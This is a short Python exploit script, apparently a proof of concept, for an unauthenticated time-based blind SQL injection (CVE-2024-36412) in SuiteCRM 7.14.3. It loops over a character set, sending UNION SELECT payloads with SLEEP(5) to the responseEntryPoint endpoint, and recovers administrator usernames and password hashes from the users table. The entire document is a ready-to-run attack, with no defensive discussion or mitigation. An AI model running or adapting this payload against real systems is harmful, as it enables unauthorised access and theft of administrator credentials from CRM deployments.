import requests

# SuiteCRM Unauthenticated SQL injection - Basic Privileged User Extractor from database.

###
# HOW: https://0x5001.com/web-security/cve-2024-36412-proof-of-concept
# PoC: http://192.168.1.26/SuiteCRM-7.14.3/index.php?entryPoint=responseEntryPoint&event=1&delegate=a<"+UNION+SELECT+(CASE+WHEN+((SELECT+group_concat(concat(user_name,':',user_hash),',')+FROM+users+WHERE+is_admin=1)+LIKE+'%%')+THEN+SLEEP(5)+ELSE+1+END);--+-&type=c&response=accept
###

url = "http://192.168.1.26/SuiteCRM-7.14.3/index.php?entryPoint=responseEntryPoint&event=1&type=c&response=accept&delegate=1"
charset = ",0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ:$/.\\_"

data = ""
while True:
    for char in charset:
        payload = f"a<\"+UNION+SELECT+(CASE+WHEN+((SELECT+group_concat(concat(user_name,':',user_hash),',')+FROM+users+WHERE+is_admin=1)+LIKE+BINARY+'{data}{char}%')+THEN+SLEEP(5)+ELSE+1+END);--+-"
        res = requests.get(url+payload)
        if res.elapsed.total_seconds() > 5:
            data += char
            print(data)
            break
